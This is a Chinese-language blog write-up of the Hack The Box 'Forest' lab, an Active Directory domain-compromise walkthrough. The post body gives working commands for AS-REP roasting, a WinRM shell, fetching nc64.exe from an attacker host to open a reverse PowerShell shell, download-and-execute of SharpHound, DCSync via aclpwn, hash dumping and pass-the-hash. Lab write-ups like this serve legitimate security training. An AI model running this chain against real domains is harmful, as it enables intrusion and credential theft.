

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="gscr10">
  <meta name="keywords" content="">
  <title>Hack the box: Forset - ri0-__Hack the World</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      
        
        
        
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.21.0/themes/prism-tomorrow.min.css" />
      
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Mr. Military</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://w.wallhaven.cc/full/2e/wallhaven-2em38y.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-09-22 20:42" pubdate>
        September 22, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      27
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">Hack the box: Forset</h1>
            
            <div class="markdown-body" id="post-body">
              <p><img src="https://p0.ssl.qhimg.com/t01040622b2d71e783a.png" srcset="/img/loading.gif"></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于Hack the box：</strong><a target="_blank" rel="noopener" href="https://www.hackthebox.eu/">Hack The Box</a>是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态<code>active</code>、<code>retired</code>。对于<code>retired</code>状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。</p>
<p><strong>关于Forest lab：</strong>我在寻找测试靶机的过程中，发现Forest在处于<code>retired</code>状态下依然可以访问，继承“白嫖一时爽，再一次更爽”的精神，今天决定对Forest下手。（前期已经白嫖过Sniper这个靶机，通过详情可参见我的上一篇安全客文章：）下图是对Sniper的简要介绍：</p>
<p><img src="https://p2.ssl.qhimg.com/t01a3102f9d3401b0f5.png" srcset="/img/loading.gif"></p>
<p><img src="https://p5.ssl.qhimg.com/t014ee4fb53a8ba6db0.png" srcset="/img/loading.gif"></p>
<p><strong>使用工具：</strong>kali、masscan、nmap、rpcclient、Impacket工具、necat、BloodHound工具、Apache、Samba、Aclpwn</p>
<h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>使用<code>masscan</code>对靶机Forest的ip：10.10.10.161 进行扫描:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate&#x3D;1000</code></pre>

<p><img src="https://p3.ssl.qhimg.com/t01a777dd8e4966e96e.png" srcset="/img/loading.gif"></p>
<p>发现一堆开放端口，貌似真的有点多。。。使用<code>nmap</code>收集对应端口的服务信息：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt</code></pre>

<p><img src="https://p2.ssl.qhimg.com/t011b2b0b254b27dae0.png" srcset="/img/loading.gif"></p>
<p>发现端口53（dns）、88（kerberos）、5985（winrm）、389/3268（ldap）、135/139/445（rpc）等。从<code>3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</code>这条信息可以发现，靶机Forest应该是<code>htb.local</code>的域控制组。</p>
<p>尝试用RPC来枚举用户，使用<code>rpcclietn</code>连接，并获取用户了列表：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ rpcclient -U &quot;&quot; -N 10.10.10.161</code></pre>

<p><img src="https://p4.ssl.qhimg.com/t016138144cbbd07b76.png" srcset="/img/loading.gif"></p>
<p>获取组列表：</p>
<p><img src="https://p5.ssl.qhimg.com/t0100adbc0a5955dc81.png" srcset="/img/loading.gif"></p>
<p>查看<code>Domain Admins</code>以及其中的<code>0x1f4</code>成员，并发现他是Administrator：</p>
<p><img src="https://p2.ssl.qhimg.com/t01d1e35a802a0fe9a1.png" srcset="/img/loading.gif"></p>
<h2 id="0x03-获得低权限的shell"><a href="#0x03-获得低权限的shell" class="headerlink" title="0x03 获得低权限的shell"></a>0x03 获得低权限的shell</h2><blockquote>
<p>这里的思路是沿着Kerberos认证向下进行的：Kerberos是一种非常复杂的身份验证协议，但它还存在一些缺陷。对Windows域认证体系下的Kerberos认证不了解的小伙伴，可以学习知乎上的这篇文章——<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77873456">初识 Windows域认证体系 Kerberos认证</a> 。</p>
<p>其中之一的缺陷就是使得攻击者可以从kerberos服务器请求数据，并对响应进行暴力攻击以找出用户密码,这就是AS-REP Roast攻击，可以参见这篇文章——<a target="_blank" rel="noopener" href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a> 。</p>
<p><img src="https://p3.ssl.qhimg.com/t010acf046da3b041c3.png" srcset="/img/loading.gif"></p>
</blockquote>
<p>为了验证漏洞，我开始浏览Impacket工具，找到<code>GetNPUsers.py</code>：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py</a> 。这个脚本的功能是遍历用户列表，并找到那些<code>Do not require Kerberos preauthentication</code>即“不需要kerberos预验证”的用户。</p>
<p>我将所有用户保存在<code>users.txt</code>中，并执行<code>GetNPUsers.py</code>，成功获取到<code>svc-alfresco</code>账户的<code>TGT</code>hash：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ for user in $(cat users.txt);do .&#x2F;GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb&#x2F;$&#123;user&#125;; done</code></pre>

<p><img src="https://p2.ssl.qhimg.com/t012924f4f6d812f4fb.png" srcset="/img/loading.gif"></p>
<p><img src="https://p0.ssl.qhimg.com/t013ae5e13aa0d298da.png" srcset="/img/loading.gif"></p>
<p>下面就是破解hash，使用<code>hashcat</code>进行破解，得到明文密码为<code>s3rvice</code>:</p>
<p><img src="https://p2.ssl.qhimg.com/t01c72e6a054f030e21.png" srcset="/img/loading.gif"></p>
<p>现在我已经拥有了一个完整的账户认证<code>svc-alfresco:s3rvice</code>，下面就是找到交互点。在nmap执行结果中，我发现端口5985是打开的，并开启<code>winrm</code>服务。为了与该服务交互，创建了一个winrm-shell脚本：</p>
<pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'winrm'</span>

conn <span class="token operator">=</span> <span class="token constant">WinRM</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Connection</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>
  endpoint<span class="token punctuation">:</span> <span class="token string">'http://10.10.10.161:5985/wsman'</span><span class="token punctuation">,</span>
  user<span class="token punctuation">:</span> <span class="token string">'svc-alfresco'</span><span class="token punctuation">,</span>
  password<span class="token punctuation">:</span> <span class="token string">'s3rvice'</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>

command<span class="token operator">=</span><span class="token string">""</span>

conn<span class="token punctuation">.</span>shell<span class="token punctuation">(</span><span class="token symbol">:powershell</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>shell<span class="token operator">|</span>
    <span class="token keyword">until</span> command <span class="token operator">==</span> <span class="token string">"exit\n"</span> <span class="token keyword">do</span>
        print <span class="token string">"PS > "</span>
        command <span class="token operator">=</span> gets        
        output <span class="token operator">=</span> shell<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>stdout<span class="token punctuation">,</span> stderr<span class="token operator">|</span>
            <span class="token constant">STDOUT</span><span class="token punctuation">.</span>print stdout
            <span class="token constant">STDERR</span><span class="token punctuation">.</span>print stderr
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>    
    puts <span class="token string">"Exiting with code <span class="token interpolation"><span class="token delimiter tag">#&#123;</span>output<span class="token punctuation">.</span>exitcode<span class="token delimiter tag">&#125;</span></span>"</span>
<span class="token keyword">end</span></code></pre>

<p>执行交互，成功获取到<code>svc-alfresco</code>的shell：</p>
<p><img src="https://p3.ssl.qhimg.com/t0167b9a4c0dd0987c0.png" srcset="/img/loading.gif"></p>
<p><strong>- 进入<code>svc-alfresco</code>用户的桌面，拿到<code>user flag</code>:</strong></p>
<p><img src="https://p4.ssl.qhimg.com/t01062c6915af4c6690.png" srcset="/img/loading.gif"></p>
<p>为了操作方便后续操作，我决定建立反向shell。把<code>nc64.exe</code>放入<code>/var/html/www</code>目录，开启Apache 服务：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ sudo service apache2 start  </code></pre>

<p><img src="https://p5.ssl.qhimg.com/t01b3d6b2f9eecdd52d.png" srcset="/img/loading.gif"></p>
<p>在winrm-shell中，下载执行，成功获取反向shell：</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> > <span class="token function">iwr</span> <span class="token operator">-</span>uri http:<span class="token operator">/</span><span class="token operator">/</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67<span class="token operator">/</span>nc64<span class="token punctuation">.</span>exe <span class="token operator">-</span>outf shell<span class="token punctuation">.</span>exe
<span class="token function">PS</span> > <span class="token punctuation">.</span><span class="token operator">/</span>shell<span class="token punctuation">.</span>exe 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67 8888 <span class="token operator">-</span>e powershell<span class="token punctuation">.</span>exe</code></pre>

<p><img src="https://p3.ssl.qhimg.com/t01983c216d5089e503.png" srcset="/img/loading.gif"></p>
<p><img src="https://p4.ssl.qhimg.com/t013fbea0b507b7a77e.png" srcset="/img/loading.gif"></p>
<h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote>
<p>这里使用到了<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/">Bloodhound</a>工具，如果有小伙伴对<code>active directly attack</code>不了解，可以参见它的github主页：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/">https://github.com/BloodHoundAD/BloodHound/</a> 和知乎文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/121552304">《使用BloodHound查找Active Directory攻击路径》</a>。BloodHound是基于图的权限探索工具，它将列出给定域中对象之间的权限和关系，可以识别Active Directory（AD）中的不同攻击路径，其中包括访问控制列表（ACL）、用户、组、信任关系和唯一的AD对象等。</p>
<p>kali可以直接运行命令安装：<code>sudo apt-get install bloodhound</code>。</p>
</blockquote>
<p>首先将项目git到本地：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ git clone https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound.git</code></pre>

<p>这里要使用<code>/BloodHoundAD/BloodHound/blob/master/Ingestors/</code>目录下的<code>SharpHound.ps1</code>工具。将它放入<code>/var/html/www</code>中，在<code>svc-alfresco</code>的shell中加载执行：</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">iex</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">"http://10.10.14.67/SharpHound.ps1"</span><span class="token punctuation">)</span>

<span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">invoke-bloodhound</span> <span class="token operator">-</span>collectionmethod all <span class="token operator">-</span>domain htb<span class="token punctuation">.</span>local <span class="token operator">-</span>ldapuser svc<span class="token operator">-</span>alfresco <span class="token operator">-</span>ldappass s3rvice

<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>
Initializing SharpHound at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020
<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>

Resolved Collection Methods: <span class="token function">Group</span><span class="token punctuation">,</span> Sessions<span class="token punctuation">,</span> LoggedOn<span class="token punctuation">,</span> Trusts<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> ObjectProps<span class="token punctuation">,</span> LocalGroups<span class="token punctuation">,</span> SPNTargets<span class="token punctuation">,</span> Container

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Creating Schema map <span class="token keyword">for</span> domain HTB<span class="token punctuation">.</span>LOCAL <span class="token keyword">using</span> path CN=Schema<span class="token punctuation">,</span>CN=Configuration<span class="token punctuation">,</span>DC=HTB<span class="token punctuation">,</span>DC=LOCAL
<span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Cache File not Found: 0 Objects in cache

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Pre<span class="token operator">-</span>populating Domain Controller SIDS
Status: 0 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>0<span class="token punctuation">)</span> <span class="token operator">--</span> <span class="token keyword">Using</span> 84 MB RAM
Status: 123 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>123 24<span class="token punctuation">.</span>6<span class="token punctuation">)</span><span class="token operator">/</span>s <span class="token operator">--</span> <span class="token keyword">Using</span> 118 MB RAM
Enumeration finished in 00:00:05<span class="token punctuation">.</span>8247737
Compressing <span class="token keyword">data</span> to C:\Users\svc<span class="token operator">-</span>alfresco\evil\20200402003811_BloodHound<span class="token punctuation">.</span>zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020<span class="token operator">!</span> Happy Graphing<span class="token operator">!</span></code></pre>

<p>执行结束后，可以看到当前目录生成了<code>20200402003811_BloodHound.zip </code>的分析结果：</p>
<p><img src="https://p1.ssl.qhimg.com/t01dc23f740f2e59396.png" srcset="/img/loading.gif"></p>
<p>为了将分析结果取回，我在kali上开启了samba服务：</p>
<p>Sam.conf:</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">...
[global]
workgroup &#x3D; WORKGROUP
server string &#x3D; Samba Server %v
netbios name &#x3D; kali
security &#x3D; user
map to guest &#x3D; bad user
name resolve order &#x3D; bcast host
dns proxy &#x3D; no
bind interfaces only &#x3D; yes

# add to the end
[evil]
   path &#x3D; &#x2F;home&#x2F;forest
   writable &#x3D; yes
   guest ok &#x3D; yes
   guest only &#x3D; yes
   read only &#x3D; no
   create mode &#x3D; 0777
   directory mode &#x3D; 0777
   force user &#x3D; nobody</code></pre>

<p><img src="https://p4.ssl.qhimg.com/t0101e6e2a4319963a7.png" srcset="/img/loading.gif"></p>
<blockquote>
<p>这里遇到一个小坑，如果靶机无法复制文件到共享目录（提示权限问题），可以直接将kali上这一共享的文件夹权限设为777，就可以成功传文件了。我猜测虽然在配置smb.conf时设置了<code>write</code>权限，配置了777，出现这个问题可能是配置与建立文件夹的先后顺序的问题。</p>
</blockquote>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">copy</span> 20200402003811_BloodHound<span class="token punctuation">.</span>zip \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67\evil</code></pre>

<p>成功取回分析文件：</p>
<p><img src="https://p0.ssl.qhimg.com/t014128cf0bf6cef0ac.png" srcset="/img/loading.gif"></p>
<p>在kali上启动BloodHound：</p>
<p><img src="https://p5.ssl.qhimg.com/t01507083738ba654c7.png" srcset="/img/loading.gif"></p>
<p><img src="https://p3.ssl.qhimg.com/t01c0103d4cb9d0eb83.png" srcset="/img/loading.gif"></p>
<p>导入分析文件<code>20200402003811_BloodHound.zip</code>，在搜索栏中搜索``svc-alfresco@htb.local<code>，添加</code>target：<a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;">&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;</a>`，可以看到分析路径图：</p>
<p><img src="https://p5.ssl.qhimg.com/t014efdf9a589c83934.png" srcset="/img/loading.gif"></p>
<p>从图中可以发现，用户<code>svc-alfresco</code>是<code>SERVICE ACCOUNT@HTB.LOCAL</code>组的成员，该组是另一个组<code>PRIVILEGED ACCOUNT@HTB.LOCAL</code>的成员，进而又是<code>ACCOUNT OPREATION@HTB.LOCAL</code>组的成员，进而又是<code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOACL</code>组的成员，最终连接到域<code>HTB.LOCAL</code>，并且还拥有<code>WriteDACL</code>权限。这一系列关键信息告诉我，可以为用户<code>svc-alfresco</code>授予<code>DCSync</code>特权，并展开<code>DCSync攻击</code>。</p>
<p>这里使用了<code>aclpwn.py</code>工具进行自动化的利用，对该工具不了解的小伙伴可以参见它的手册：<a target="_blank" rel="noopener" href="https://github.com/fox-it/aclpwn.py/wiki/Quickstart">https://github.com/fox-it/aclpwn.py/wiki/Quickstart</a> ：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password &#39;s3rvice&#39;</code></pre>

<p><img src="https://p2.ssl.qhimg.com/t012b0f00897f4a809c.png" srcset="/img/loading.gif"></p>
<p>接着<code>secretsdump.py</code>获取域中所有的用户hash，成功收获<code>Administrator</code>的hash值：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;secretsdump.py -just-dc-ntlm &#39;svc-alfresco:s3rvice@10.10.10.161&#39;   </code></pre>

<p><img src="https://p2.ssl.qhimg.com/t0104fe28891db822c0.png" srcset="/img/loading.gif"></p>
<p>利用Impacket工具中<code>wmiexec.py</code>脚本，使用该hash登录Administrator用户，成功获得超级权限：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ python .&#x2F;wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</code></pre>

<p><img src="https://p3.ssl.qhimg.com/t01b74cf7cf4d6a0dfd.png" srcset="/img/loading.gif"></p>
<p>进入超级用户桌面，成功拿到<code>root flag</code>:</p>
<p><img src="https://p4.ssl.qhimg.com/t0117e15cb637b6e633.png" srcset="/img/loading.gif"></p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>域渗透还需要进一步学习和提高，这次针对Forest靶机的渗透，弥补了很多知识空白，过程并不像文章整理的那样流畅，是一个自认为挺艰难的的过程。</p>
<p>最后，对Forest靶机的渗透测试过程进行一个简单的总结：</p>
<ul>
<li><p><strong>信息收集：</strong>查看端口、服务状态，获取到域内关键信息</p>
</li>
<li><p><strong>AS-REP Roast攻击 + hash 爆破：</strong>获取低级用户的密码，拿到user flag</p>
</li>
<li><p><strong>利用BloodHound展开域渗透分析</strong></p>
</li>
<li><p><strong>利用ACLPWN工具展开DCSync攻击：</strong>提权，获得超级用户的hash，拿到root flag</p>
</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/htb/">htb</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/htb/">htb</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-01%E9%AB%98%E6%96%AF%E5%88%86%E5%B8%83/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">机器学习手推笔记_01高斯分布</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/22/Hack-the-box-Sniper/">
                        <span class="hidden-mobile">Hack the box: Sniper</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  
    
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Hack the box: Forset&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















